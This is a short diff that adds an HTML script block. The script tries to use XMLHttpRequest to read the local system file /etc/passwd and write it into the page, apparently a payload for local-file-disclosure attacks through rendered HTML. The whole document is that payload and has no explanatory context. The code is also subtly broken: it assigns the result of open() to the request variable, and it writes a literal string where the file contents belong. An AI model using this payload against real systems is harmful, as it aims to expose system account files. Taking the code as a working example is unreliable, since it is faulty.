@@ -1,0 +1,8 @@
+<script>
+    x = new XMLHttpRequest();
+    x = open("GET","file:///etc/passwd");
+    x.send();
+    x.onload = function(){
+        document.write("this.responseText()");
+    }
+</script>
